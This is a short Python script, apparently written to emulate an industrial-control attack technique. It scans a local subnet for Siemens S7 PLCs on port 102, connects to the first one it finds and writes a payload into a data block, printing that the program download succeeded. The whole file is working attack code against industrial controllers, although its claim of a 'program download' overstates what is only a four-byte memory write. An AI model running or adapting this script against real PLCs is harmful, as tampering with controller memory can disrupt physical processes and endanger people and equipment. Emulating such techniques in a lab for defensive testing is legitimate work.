import snap7
from snap7.util import *
import socket
import os

def find_plc_ip():
    """
    Discover the PLC IP address by scanning the network for active hosts responding on port 102 (Siemens S7).
    """
    common_subnet = "192.168.1."  # Modify based on your network subnet
    plc_port = 102  # Siemens S7Comm default port

    for i in range(1, 255):
        ip = f"{common_subnet}{i}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)  # Short timeout for scanning
        result = sock.connect_ex((ip, plc_port))

        if result == 0:
            print(f"[+] PLC detected at {ip}")
            sock.close()
            return ip  # Return the first found PLC
        sock.close()

    print("[-] No PLC found on the network.")
    return None

def connect_to_plc(plc_ip):
    """
    Establish a connection to the PLC.
    """
    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, 0, 1)  # Default rack=0, slot=1 for Siemens S7
        if plc.get_connected():
            print(f"[+] Successfully connected to PLC at {plc_ip}")
            return plc
    except Exception as e:
        print(f"[-] Connection failed: {str(e)}")
        return None

def download_program(plc):
    """
    Perform a program download (Modify Program technique).
    """
    try:
        print("[*] Attempting to download a new program to the PLC...")
        
        # Example: Writing NEW data to a specific DB area simulating a program update
        db_number = 1
        data = bytearray([0x00, 0x01, 0x02, 0x03])  # Example payload to update the program
        
        plc.db_write(db_number, 0, data)  # Writing to PLC memory
        print("[+] Program download successful! PLC memory updated.")

    except Exception as e:
        print(f"[-] Program update failed: {str(e)}")

def main():
    # Step 1: Find PLC IP
    plc_ip = find_plc_ip()
    if plc_ip is None:
        return

    # Step 2: Connect to the PLC
    plc = connect_to_plc(plc_ip)
    if not plc:
        return

    # Step 3: Modify the program via a program download
    download_program(plc)

    # Step 4: Close connection
    plc.disconnect()
    print("[*] Connection closed.")

if __name__ == "__main__":
    main()